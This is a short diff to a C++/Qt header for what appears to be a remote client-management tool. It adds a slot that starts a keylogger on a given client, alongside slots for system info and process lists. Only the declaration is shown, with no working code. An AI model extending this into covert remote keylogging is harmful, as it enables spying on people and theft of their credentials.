@@ -37,6 +37,7 @@ signals:
 
 public slots:
     void onGetInfoSys(const QString& clientId);
+    void onStartKeylogger(const QString& clientId);
     void onRequestProcessList(const QString& clientId, bool namesOnly);
     void sendToClient(const QString& clientInfo, const QByteArray& data);
 
